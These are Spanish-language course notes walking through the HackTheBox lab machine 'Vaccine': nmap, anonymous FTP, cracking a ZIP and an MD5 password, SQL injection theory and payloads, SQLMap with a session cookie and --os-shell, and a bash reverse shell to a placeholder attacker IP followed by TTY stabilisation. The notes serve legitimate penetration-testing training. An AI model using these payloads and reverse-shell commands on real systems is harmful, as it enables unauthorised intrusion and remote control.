---
tags:
- Máquinas y prácticas
date: '2026-06-11'
---

# Vaccine Repaso

<p class="note-meta">2026-06-11</p>

**EVOLVE ACADEMY · Máster en Ciberseguridad Ofensiva**

# Vaccine (Tier 2) — Repaso en profundidad

**Sesión del 11/06/2026** · SQL Injection (teoría) · Cookies · SQLMap · Estabilización de la TTY

| **ℹ Resumen de la sesión**  Segunda pasada a la máquina **Vaccine** (transcrita «Bacine»/«basín»), esta vez con un instructor distinto que la trabaja **más despacio y a fondo**. No es contenido nuevo de máquina, sino una **profundización**: por qué la comilla rompe la consulta, cómo funciona realmente la **inyección SQL** (de forma manual conceptual), cómo se gestionan las **cookies de sesión**, el porqué de cada paso de **SQLMap**, y el **tratamiento de la TTY** para estabilizar la shell — esta última parte no se llegó a ver con Dani.  La **escalada de privilegios quedó pendiente** por falta de tiempo: se cierra en la siguiente clase de repaso con Yuba. La máquina siguiente (**Oopsie**, «UPSI») tampoco se tocó. |
| --- |

## Conexión con sesiones anteriores

- Esta sesión es la **segunda vuelta a Vaccine**, ya resuelta el 10/06 con Dani. Aquí se rellenan los huecos: la **estabilización de la shell** (TTY) y la **lógica de la inyección SQL**.
- Reaparecen y se consolidan: nmap -sCV, FTP anónimo, zip2john + **John**, crackeo de **MD5**, **SQLMap** con cookie y --os-shell, todo visto el día anterior.
- Se enlaza con el concepto de **credenciales reutilizables** (la del ZIP, la del login MD5) ya trabajado en sesiones previas.
- Adelanto de futuro: dentro de ~2 semanas se **vuelve a esta misma máquina** para explotar la SQLi **de forma manual** (módulo web).

## Hoja de ruta del máster (lo que viene)

El instructor dedicó un rato a situar el calendario. Resumen accionable:

- **Ahora:** cerrar Starting Point Tier 2. Algunas máquinas se dejarán a medias (la escalada se verá en bloque propio más adelante).
- **Siguientes semanas:** máquinas «locales» (estilo Metasploitable pero más pequeñas) para afianzar metodología.
- **Módulo web (2 semanas full):** SQL Injection manual, **SSRF, LFI, Path Traversal, XXE, XSS**, apoyándose en **PortSwigger** y trabajando los distintos contextos (whitelist/blacklist).
- **Recta final:** combinación de **Blue Team** + web, y entrada a máquinas de **HTB** (VPN de máquinas, no de Starting Point).
- **Después:** Directorio Activo, pivoting, movimientos laterales y escalada de privilegios.

| **ℹ Por qué importan las máquinas de HTB**  Aunque se resuelvan con guía, tener un buen número de máquinas hechas «llama la atención» en entrevistas y demuestra recorrido práctico. HTB ha añadido una **API** para mapear máquinas y montar \*solvers\*. |
| --- |

## Cadena de Vaccine (recordatorio) y foco de hoy

La ruta es la misma del 10/06. En **negrita** lo que se profundizó hoy:

| **ping (TTL 63 = Linux)** | **→** | **nmap -sCV** | **→** | **FTP anónimo → backup.zip** | **→** | **zip2john + john** |
| --- | --- | --- | --- | --- | --- | --- |

| **Código filtrado → MD5** | **→** | **SQLi: comilla y lógica** | **→** | **SQLMap + cookie → os-shell** | **→** | **TTY: shell estable** |
| --- | --- | --- | --- | --- | --- | --- |

| **⚠ Pendiente para la próxima clase (repaso con Yuba)**  **Escalada de privilegios** (sudo -l → GTFOBins) — quedó sin ver por tiempo. La cadena completa de privesc está en los apuntes del 10/06. |
| --- |

# 1. Reconocimiento

### Primer contacto: ping y TTL

Antes de escanear, un ping rápido. El **TTL** da una pista del sistema operativo:

| **Detección de SO por TTL** |
| --- |
| $ ping -c 1 <IP>  TTL 63 -> maquina Linux (64 menos saltos de la VPN de HTB)  TTL ~127 -> normalmente Windows |

### Nmap en dos fases

Primero un barrido rápido de puertos, luego scripts + versiones solo sobre los abiertos. Resultado: **21 (FTP), 22 (SSH), 80 (HTTP)**.

| **Enumeración con Nmap** |
| --- |
| *Fase 1 - descubrir puertos abiertos (rapido)*  $ nmap -p- --min-rate 5000 <IP>  *Fase 2 - scripts (-sC) + versiones (-sV) sobre los puertos hallados*  $ nmap -sCV -p21,22,80 <IP>  -> el script ftp-anon confirma 'Anonymous FTP login allowed' y lista backup.zip |
| **ℹ Formatos de salida de Nmap (guardar el escaneo)**  -oN salida.txt normal · -oG salida.txt \*grepeable\* (cómodo para filtrar con grep) · -oX XML · -oA base los tres a la vez. También vale redirigir con > salida.txt. Metodología recomendada: **guardar siempre** los escaneos, sobre todo en exámenes. |
| **⚠ Cuidado con los timings en entornos reales/certificación**  --min-rate 5000 va muy rápido y en HTB no hay problema, pero en un examen o entorno real un escaneo agresivo puede **perder puertos** (servicios que aún no han levantado). Conviene relanzar el escaneo pasados unos minutos para confirmar. |

### Qué esperar de cada puerto

| **Puerto** | **Servicio** | **Qué se puede hacer** |
| --- | --- | --- |
| 21 | FTP | Si hay **anonymous**, acceso directo. Vector principal aquí. |
| 22 | SSH | Sin credenciales, poco. Como mucho **enumerar usuarios** y fuerza bruta; útil si tenemos credenciales filtradas. |
| 80 | HTTP | Web a analizar con calma. Nmap puede avisar de cabeceras de seguridad ausentes. |

# 2. FTP anónimo en profundidad

FTP es como «un pendrive incrustado en un servidor»: un almacenamiento compartido. Nos conectamos como anonymous y descargamos backup.zip.

| **Acceso por FTP anónimo** |
| --- |
| *Conectar (usuario anonymous, password vacia o cualquiera)*  $ ftp <IP>  $ ftp> ls # ver contenido (fijarse en permisos: 'd' = directorio)  $ ftp> binary # modo binario para no corromper el zip  $ ftp> get backup.zip  $ ftp> mget \* # alternativa: descargar TODO de golpe  $ ftp> exit |
| **ℹ Detalle: ¿archivo o directorio?**  En el listado, si los permisos empiezan por **`d`** es un **directorio** (aunque el nombre acabe en .zip, podrían intentar engañar). Si no hay d, es un archivo. Ante dudas de tipo de fichero, usar file backup.zip para confirmar que de verdad es un ZIP y no una imagen u otra cosa. |
| **✔ Relación FTP ↔ Web (concepto clave)**  Muchas veces los archivos del FTP se sirven también desde la web. Si conseguimos **subir** un archivo por FTP (put) y luego lo vemos en la web (p. ej. http://<IP>/upload/FTP/...) y el servidor lo **ejecuta**, tenemos un vector de entrada (webshell). Subir no es hackear: hay que **subir Y ejecutar**.  Flujo de comprobación: 1) ¿puedo subir? 2) ¿aparece ese archivo en la web? 3) ¿el servidor lo interpreta? |
| **Si el cliente ftp falla...** | **Alternativa** |
| Descarga directa sin entrar al prompt | wget --no-passive-ftp ftp://anonymous:anonymous@<IP>/backup.zip |
| Cliente más cómodo | lftp <IP> y mget \* |
| Vía curl | curl -u anonymous: ftp://<IP>/backup.zip -o backup.zip |

# 3. Crackeo del ZIP (zip2john + John)

El backup.zip pide contraseña. La idea: extraer el **«núcleo»/hash** del ZIP con zip2john y romperlo con **John** + diccionario rockyou. Todo esto es **local** y no genera ruido en la máquina víctima.

| **Crackeo del ZIP** |
| --- |
| *1) Extraer el hash del ZIP (tipo PKZIP) a un fichero*  $ zip2john backup.zip > hash  *2) Romper con John + rockyou*  $ john --wordlist=/usr/share/wordlists/rockyou.txt hash  *3) Recordar una contraseña ya crackeada (la guarda en su 'pot')*  $ john --show hash  *4) Descomprimir con la contraseña obtenida*  $ unzip backup.zip  -> obtenemos index.php y style.css |
| **ℹ Detalle nuevo: john --show y el «pot»**  John guarda las contraseñas ya crackeadas en un archivo interno. Si vuelves a lanzarlo te dirá que el hash ya está roto; con john --show hash lo recuperas sin volver a procesar el diccionario. |
| **⚠ John vs Hashcat para ZIP**  El instructor recomienda **John** para zip2john: detecta el formato automáticamente y lo rompe rápido. **Hashcat** (-m 13600 para WinZip / -m 0 para MD5) da más juego en entornos grandes con GPU, pero suele dar más problemas de detección de formato cuando no sabes el tipo exacto. Para CTF/ZIP, John. |
| **✔ Alternativas**  **fcrackzip:** fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip.  **Hashcat ZIP:** hashcat -m 13600 hash /usr/share/wordlists/rockyou.txt.  Si rockyou está comprimido: gunzip /usr/share/wordlists/rockyou.txt.gz. |

# 4. Código filtrado y crackeo del MD5

Dentro del ZIP está el **código fuente** del login (index.php). Esto es oro: el PHP normalmente no se ve desde el navegador (es backend, se interpreta), pero un **backup filtrado** lo expone.

| **ℹ Código visible (Ctrl+U) vs código fuente**  Con **Ctrl+U** solo ves el HTML/JS que llega al navegador. El **PHP** (la lógica de backend) nunca aparece ahí: se interpreta en el servidor y «desaparece». Por eso un backup con el .php dentro es tan valioso — es el código fuente real. |
| --- |

La lógica del login (resumida) es un if:

| **Lógica del login (index.php)** |
| --- |
| $ if ($username === 'admin' && md5($password) === '<hash>') {  *// login correcto -> redirige a dashboard.php*  $ } |

Es un login **hardcodeado** (no consulta base de datos): solo entra con admin y la contraseña cuyo MD5 coincide. Como la AND exige las dos condiciones, hay que acertar usuario **y** contraseña.

### Romper el MD5

El campo es MD5 «a secas». El truco: el servidor hace md5(password) y compara; nosotros aplicamos la **inversa** (decode) sobre el hash con CrackStation.

| **Crackeo del MD5** |
| --- |
| *Opcion A - online (CrackStation / hashes.com): pegar el hash MD5*  -> devuelve la credencial: qwerty789 (usuario admin)  *Opcion B - John en local*  $ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  *Opcion C - Hashcat (MD5 = modo 0)*  $ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt |
| **ℹ Propiedades del MD5 y cómo identificarlo**  MD5 es **determinista** (el mismo texto siempre da el mismo hash) y **sensible a mayúsculas** (hola ≠ Hola). CrackStation funciona como una **base de datos gigante** de hash→texto precalculados; por eso «descifra» al instante lo común.  Para identificar un hash desconocido: hashid '<hash>' o **hash-identifier** (también la web de dCode), que listan los tipos probables (MD5, MD4...). **CyberChef** sirve para encode/decode rápido. |
| **⚠ CrackStation puede caer**  Es cómoda, pero depende de un tercero: hoy funciona, mañana puede no estar. Conviene dominar también el método local (John/Hashcat). |

# 5. Inyección SQL: la teoría (lo nuevo de hoy)

Tras loguear como admin:qwerty789, el panel **MegaCorp** tiene un buscador de coches. El instructor explica POR QUÉ hay inyección, no solo cómo automatizarla.

### Paso 0: ¿hay base de datos siquiera?

Antes de hablar de SQLi hay que confirmar que los datos vienen de una base de datos y no están **hardcodeados** en el HTML. Aquí, al filtrar por tipos inexistentes (sub) no devuelve nada y por reales (petrol, diesel) sí: los datos vienen de una consulta → hay base de datos (PostgreSQL).

### Paso 1: la comilla y el error

La consulta que hay detrás es aproximadamente:

| **Consulta por detrás (aprox.)** |
| --- |
| $ SELECT \* FROM cars WHERE name ILIKE '%<lo\_que\_buscas>%' |

Al meter una **comilla** ' en el buscador, se rompe la sintaxis y salta un error (unterminated quoted string... SELECT \* FROM cars where name ILIKE...). Ese error es el **indicio** de inyección.

| **⛔ Por qué pasa**  Nuestra entrada se mete **dentro** de las comillas de la consulta. Al añadir una comilla de más, cerramos la cadena antes de tiempo y dejamos SQL «colgando» → error de sintaxis. Si una comilla da error pero dos no, el indicio es aún más fuerte. |
| --- |

### Paso 2: cerrar y comentar

La técnica manual: **cerrar** la cadena con ', inyectar lo que queramos, y **comentar** el resto de la consulta original con -- - (en SQL, todo lo que va tras el comentario se ignora).

| **Cerrar la consulta y comentar** |
| --- |
| *Bypass de login clasico (sobre una consulta de autenticacion):*  $ admin' -- -  $ ' OR 1=1 -- -  *Resultado conceptual de la consulta:*  SELECT \* FROM users WHERE username = 'admin' -- -' AND password = '...'  (la parte de la password queda comentada -> solo comprueba el usuario) |
| **ℹ Enumerar columnas y ataque por tiempo**  ' ORDER BY 5 -- - ayuda a deducir el número de columnas (cuando falla, has pasado el límite).  **Time-based:** inyectar algo que duerma la consulta (un sleep). Si la página tarda **5 segundos** justos en cargar cuando lo pides y milisegundos cuando no, confirma que controlas la consulta (útil cuando no hay error visible — \*blind\*). |
| **⚠ Hoy solo automático**  Esta lógica manual se trabajará a fondo en el módulo web (~2 semanas), volviendo a esta misma máquina. Hoy se explota con **SQLMap** para no alargar. La explotación manual no cambia entre PostgreSQL y MySQL en lo esencial. |

# 6. SQLMap en la práctica

| **⛔ Antes de lanzarlo: dos avisos serios**  **1) En certificaciones (OSCP y similares) NO se permite SQLMap.** Hay que saber explotar a mano.  **2) Hace muchísimo ruido**: lanza cientos de peticiones. Jamás contra producción sin autorización — puede romper la base de datos o el servicio. En HTB o pre-producción autorizada, sin problema. |
| --- |

El parámetro vulnerable (search en dashboard.php) está **autenticado**: sin cookie, SQLMap recibe un 302 redirect a index.php (el login). Hay que pasarle la **cookie de sesión** (PHPSESSID).

### Conseguir la cookie

- **Manual:** navegador → Inspeccionar → **Storage** → **Cookies** → copiar el valor de PHPSESSID.
- **Cómodo (herramienta nueva):** extensión **Cookie Editor** para Firefox — ver, copiar y editar cookies con un clic, e incluso exportarlas a JSON.

### Workflow recomendado (en dos pasos)

Primero solo **detectar** la vulnerabilidad; después, ya confirmada, lanzar la explotación. Evita problemas y ruido innecesario.

| **SQLMap → os-shell (dos pasos)** |
| --- |
| *Paso 1 - solo detectar que es vulnerable (sin extraer nada)*  $ sqlmap -u 'http://<IP>/dashboard.php?search=test' --cookie='PHPSESSID=<valor>' --batch  -> 'GET parameter search is vulnerable' (PostgreSQL, error-based)  *Paso 2 - ya confirmada, pedir una shell del sistema*  $ sqlmap -u 'http://<IP>/dashboard.php?search=test' --cookie='PHPSESSID=<valor>' --os-shell --batch  -> shell como usuario postgres |
| **⚠ Errores comunes que hacen fallar SQLMap**  Un **espacio de más** dentro de las comillas de la URL o de la cookie hace que falle: revisa que el comando esté limpio y en **una sola línea**.  Olvidar el **nombre** de la cookie: hay que poner PHPSESSID=valor, no solo el valor.  La **cookie caduca** (en PHP, por defecto ~24 min): si la sesión expira a mitad de trabajo, vuelve a sacarla.  Si responde infinitamente, seguramente dijiste «sí» a \*seguir probando otras técnicas\*: usa --batch y responde que no a más pruebas. |
| **✔ Alternativas**  Pasar la **petición de Burp** a fichero y sqlmap -r req.txt --os-shell --batch (lleva la cookie incluida).  Subir cobertura: --level=5 --risk=3; forzar motor: --dbms=postgresql.  **Ghauri** como alternativa a SQLMap. Y, sobre todo, la **explotación manual** (el objetivo del módulo web). |

# 7. Cookies de sesión a fondo

Concepto que el instructor desarrolló bastante y conviene fijar.

- **Qué es `PHPSESSID`:** una cookie de sesión. El servidor comprueba en cada petición si ese valor corresponde a una sesión autenticada; decide «te dejo pasar o no». Si la cambias, dejas de estar logueado.
- **Para qué sirve:** no tener que reloguear en cada página. Tras el login se «setea» y dura hasta **caducar** (en PHP ~24 min por defecto, configurable). Cambia en cada nuevo login.
- **Analogía:** es como el **sello de una discoteca** — una vez te han comprobado el DNI (login), el sello (cookie) te deja entrar y salir hasta que «caduca».

| **⚠ Vulnerabilidad relacionada: flags HttpOnly y Secure**  En las cookies aparecen las flags **HttpOnly** y **Secure**. Si están en **false**, es un hallazgo reportable en una auditoría web (deberían estar en **true**).  Con **HttpOnly** la cookie no es accesible desde JavaScript, lo que mitiga el **robo de cookie vía XSS** (inyectar código para robar la sesión). **Secure** fuerza que solo viaje por HTTPS.  Paralelismo: usar **HTTPS** y no HTTP evita que un \*man-in-the-middle\* lea las credenciales en texto claro al esnifar la red. |
| --- |

# 8. Estabilización de la shell (tratamiento de la TTY)

La parte que faltaba. La os-shell de SQLMap es muy incómoda (pide confirmación, no es interactiva). El objetivo: pasar a una **reverse shell** propia y luego **estabilizar la TTY**.

### Paso 1: saltar a una reverse shell con netcat

| **De os-shell a reverse shell** |
| --- |
| *En tu Kali: listener*  $ sudo nc -lvnp 999  *Desde la os-shell de SQLMap: one-liner de bash hacia TU IP y puerto*  $ bash -i >& /dev/tcp/<TU\_IP>/999 0>&1 |

### Paso 2: estabilizar la TTY

Una vez recibida la shell, se «trata» para que sea interactiva y no se rompa. Método recomendado por el instructor (el clásico que aparece en revshells.com como opción 1, **cambiando `python` por `python3`**):

| **Estabilización de la TTY** |
| --- |
| *1) Spawnear una PTY (OJO: python3, no python)*  $ python3 -c 'import pty;pty.spawn("/bin/bash")'  *2) Ctrl+Z para suspender, y en tu Kali:*  $ stty raw -echo; fg  *3) Ajustar el tipo de terminal*  $ export TERM=xterm |
| **ℹ La estabilidad va «por porcentaje»**  No todas las shells son igual de estables: **SSH ≈ 100%**, una shell de **netcat / one-liner / payload** puede quedarse en un **40–60%**. Algunos comandos pueden no ir (p. ej. ifconfig); en ese caso usar el equivalente ip a. Venir desde **SQLMap** lo hace aún más inestable, de ahí el salto a reverse shell + estabilización. |
| **✔ Alternativas para estabilizar / generar la shell**  Si no hay python3: probar script -qc /bin/bash /dev/null o socat (socat file:tty,raw,echo=0 tcp-listen:PORT).  Generar el one-liner adecuado en **revshells.com** (sección de TTY/estabilización incluida).  Listener con historial: rlwrap nc -lvnp 999 o pwncat-cs -lp 999 (estabiliza casi solo). |
| **⚠ Escalada de privilegios — pendiente**  Aquí se acabó el tiempo. La escalada (sudo -l revela que postgres puede ejecutar vi/vim como root → shell vía **GTFOBins** → root.txt) está detallada en los **apuntes del 10/06** y se repasará con Yuba. |

# 9. Chuleta rápida de comandos (con alternativas)

| **Fase** | **Comando principal** | **Alternativa / si falla** |
| --- | --- | --- |
| Detección SO | ping -c 1 <IP> (mira el TTL) | nmap -O <IP> (fingerprint de SO) |
| Puertos | nmap -p- --min-rate 5000 <IP> | rustscan -a <IP> · relanzar si faltan puertos |
| Versiones+scripts | nmap -sCV -p21,22,80 <IP> | nmap -p21 --script ftp-anon <IP> |
| FTP anónimo | ftp <IP> → get backup.zip | wget ftp://anonymous:anonymous@<IP>/backup.zip |
| Verificar tipo | file backup.zip | — |
| Hash del ZIP | zip2john backup.zip > hash | fcrackzip -u -D -p rockyou.txt backup.zip |
| Romper ZIP/MD5 | john --wordlist=rockyou.txt hash | john --show hash · hashcat -m 0/13600 |
| Identificar hash | hashid '<hash>' | hash-identifier · dCode · CyberChef |
| Coger cookie | Storage → Cookies → PHPSESSID | extensión **Cookie Editor** |
| SQLi detectar | sqlmap -u '...?search=x' --cookie='PHPSESSID=...' --batch | sqlmap -r req.txt --batch |
| SQLi explotar | añadir --os-shell | --level=5 --risk=3 --dbms=postgresql · ghauri |
| Reverse shell | bash -i >& /dev/tcp/IP/PORT 0>&1 | FIFO mkfifo+nc · Python pty · revshells.com |
| Listener | sudo nc -lvnp <PORT> | rlwrap nc -lvnp <PORT> · pwncat-cs -lp |
| Estabilizar TTY | python3 -c 'import pty;pty.spawn("/bin/bash")' | script -qc /bin/bash /dev/null · socat |
| Si ifconfig no va | ip a | — |

# 10. Herramientas utilizadas en la sesión

| **Herramienta** | **Objetivo** | **Fase** | **Comando / uso visto** | **Nivel** |
| --- | --- | --- | --- | --- |
| ping | Detectar SO por TTL | Reconocimiento | ping -c 1 <IP> (TTL 63=Linux) | Recurrente |
| Nmap | Puertos, versiones y scripts | Reconocimiento | nmap -p-, -sCV, -oG | Recurrente |
| ftp | Acceso anónimo y descarga | Acceso | ftp, get, mget, binary | Practicado |
| file | Verificar tipo real de archivo | Análisis | file backup.zip | Introducido |
| zip2john | Extraer hash del ZIP | Cracking | zip2john backup.zip | Practicado |
| John the Ripper | Romper hashes (ZIP, MD5) | Cracking | --wordlist, --show, --format=raw-md5 | Recurrente |
| Hashcat | Romper hashes (GPU) | Cracking | -m 0 MD5, -m 13600 ZIP | Practicado |
| CrackStation | Romper MD5 online (lookup) | Cracking | Pegar hash → qwerty789 | Practicado |
| hashid / hash-identifier | Identificar tipo de hash | Cracking | hashid '<hash>' | Introducido |
| SQLMap | Inyección SQL automatizada | Explotación web | --cookie, dos pasos, --os-shell | Practicado |
| Cookie Editor | Ver/editar/exportar cookies | Web | Extensión Firefox | Introducido |
| netcat (nc) | Listener de reverse shell | Explotación | sudo nc -lvnp 999 | Recurrente |
| bash one-liner | Reverse shell | Explotación | bash -i >& /dev/tcp/IP/PORT 0>&1 | Practicado |
| python3 / stty | Estabilizar TTY | Post-explotación | pty.spawn, stty raw -echo | Introducido |

## Conceptos clave consolidados hoy

- **SQL Injection** = inyectar SQL aprovechando que nuestra entrada se mete en la consulta. Indicio: la comilla da error. Técnica: cerrar (') + comentar (-- -); detectar por error, por unión o por tiempo (\*blind\*).
- **Cookie de sesión** = «sello» que prueba que estás autenticado; necesaria para que SQLMap ataque endpoints autenticados. Flags HttpOnly/Secure protegen frente a robo (XSS/MITM).
- **Tratamiento de TTY** = convertir una shell precaria en una interactiva y estable (pty.spawn + stty + TERM). La estabilidad depende del origen (SSH alto, netcat/SQLMap bajo).
- **Código fuente vs visible:** el PHP backend no se ve con Ctrl+U; un backup filtrado lo expone y permite entender la lógica del login.

## Checklist de la sesión

- ping para TTL → SO. nmap -p- y luego -sCV. Guardar la salida.
- FTP anónimo → descargar todo (mget \*); recordar la relación FTP↔web.
- zip2john + john (+--show). Verificar tipos con file.
- Leer el código filtrado; romper el MD5 (CrackStation / John). Credencial: admin:qwerty789.
- Probar comilla en el buscador → error → SQLi. Coger PHPSESSID (Cookie Editor).
- SQLMap en 2 pasos: detectar → --os-shell (usuario postgres).
- Saltar a reverse shell (bash -i >& /dev/tcp/...) y **estabilizar la TTY**.
- Pendiente: escalada de privilegios (sudo -l + GTFOBins) — ver apuntes del 10/06.

## Actualización del registro de herramientas

- **Nuevas en el registro:** file (Introducida), hashid/hash-identifier (Introducida), **Cookie Editor** (Introducida), revshells.com y stty/pty para tratamiento de TTY (Introducidas).
- **Suben de nivel:** **SQLMap** → Practicada (cookie + flujo en 2 pasos + os-shell); **zip2john** → Practicada; **CrackStation** → Practicada; **bash one-liner** de reverse shell → Practicada.
- **Concepto nuevo afianzado:** estabilización de TTY y lógica manual de SQL Injection (se profundizará en el módulo web).
- **Pendiente próxima clase (Yuba):** cierre de Vaccine con la escalada de privilegios; después, la máquina **Oopsie** (IDOR).

*Evolve Academy · Máster en Ciberseguridad Ofensiva · Sesión 11/06/2026 · Vaccine (repaso en profundidad)*
